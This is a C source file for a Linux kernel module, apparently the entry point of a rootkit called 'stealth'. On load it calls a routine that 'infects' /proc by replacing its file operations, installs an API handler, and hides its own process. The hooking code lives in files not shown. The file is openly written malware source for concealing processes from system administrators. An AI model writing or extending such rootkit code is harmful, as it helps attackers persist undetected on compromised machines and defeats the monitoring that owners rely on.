#include "module.h"

stealth_t* state = NULL;

stealth_t* stealth_init_state(void)
{
    stealth_t* result = (stealth_t*) vmalloc(sizeof(stealth_t));
    result->proc_inode = NULL;
    result->orig_proc_fops = NULL;
    result->hidden_process_count = 0;

    return result;
}

static int __init stealth_init(void)
{
    printk(KERN_INFO "Stealth loading!\n");
    state = stealth_init_state();

    if(stealth_proc_infect() != 0)
        printk(KERN_INFO "Failed to infect proc\n");

    if(stealth_api_init() != 0)
        printk(KERN_INFO "Unable to install API handler\n");

    stealth_proc_hide("stealth", PROCESS_LENGTH);

    return 0;
}


static void __exit stealth_exit(void)
{
    stealth_proc_clean();
    stealth_api_deinit();
    printk(KERN_INFO "Bye!\n");
}

module_init(stealth_init);
module_exit(stealth_exit);
